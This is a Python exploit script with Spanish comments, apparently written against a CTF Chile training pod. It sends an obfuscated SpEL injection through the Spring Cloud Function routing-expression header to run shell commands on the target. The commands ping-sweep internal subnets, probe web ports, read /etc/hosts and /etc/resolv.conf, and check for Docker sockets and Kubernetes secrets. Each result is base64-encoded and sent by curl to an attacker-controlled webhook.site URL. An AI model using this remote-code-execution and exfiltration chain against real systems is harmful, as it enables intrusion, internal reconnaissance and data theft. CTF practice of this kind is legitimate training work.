#!/usr/bin/env python3
"""
CTF Chile - Descubrimiento completo de red interna
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Análisis completo de red interna...")

# Información de red actual
probe("current_network_info", "ip addr show && echo '---ROUTES---' && ip route")

# Escaneo de la red 10.109.220.x (red del contenedor actual)
print("[*] Escaneando red 10.109.220.x...")
for i in [1, 2, 3, 5, 10, 254]:
    probe(f"ping_109_220_{i}", f"timeout 2 ping -c 1 10.109.220.{i} >/dev/null 2>&1 && echo 'ALIVE: 10.109.220.{i}' || echo 'DOWN: 10.109.220.{i}'")

# Escaneo de la red 10.160.209.x (segunda red identificada)
print("[*] Escaneando red 10.160.209.x...")
for i in [1, 2, 3, 4, 5, 10, 254]:
    probe(f"ping_160_209_{i}", f"timeout 2 ping -c 1 10.160.209.{i} >/dev/null 2>&1 && echo 'ALIVE: 10.160.209.{i}' || echo 'DOWN: 10.160.209.{i}'")

# Servicios web en hosts activos
print("[*] Probando servicios web en IPs conocidas...")
probe("web_scan_209_1", "for port in 80 8080 443 8443 3000; do timeout 3 curl -s http://10.160.209.1:$port | head -3 && echo 'PORT '$port' OPEN on 10.160.209.1' || echo 'PORT '$port' CLOSED'; done")
probe("web_scan_209_2", "for port in 80 8080 443 8443 3000; do timeout 3 curl -s http://10.160.209.2:$port | head -3 && echo 'PORT '$port' OPEN on 10.160.209.2' || echo 'PORT '$port' CLOSED'; done")

# DNS y service discovery
print("[*] Información de DNS y servicios...")
probe("dns_info", "cat /etc/resolv.conf && echo '---HOSTS---' && cat /etc/hosts")
probe("netstat_listen", "netstat -tuln 2>/dev/null || ss -tuln")

# Buscar servicios Docker/Kubernetes
probe("docker_info", "ls -la /var/run/docker.sock 2>/dev/null || echo 'No Docker socket'")
probe("k8s_info", "ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null || echo 'No K8s secrets'")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=30", timeout=10)
data = r.json().get("data", [])

active_hosts = []
open_ports = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar hosts activos y puertos abiertos
            if "ALIVE:" in decoded:
                host = decoded.split("ALIVE: ")[1].strip()
                active_hosts.append(host)
                print(f"🟢 HOST ACTIVO: {host}")

            if "PORT" in decoded and "OPEN" in decoded:
                open_ports.append(decoded)
                print(f"🔓 PUERTO ABIERTO: {decoded}")

            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

# Resumen de descubrimientos
if active_hosts:
    print(f"\n[*] HOSTS ACTIVOS ENCONTRADOS: {', '.join(set(active_hosts))}")
if open_ports:
    print(f"[*] PUERTOS ABIERTOS ENCONTRADOS: {len(open_ports)}")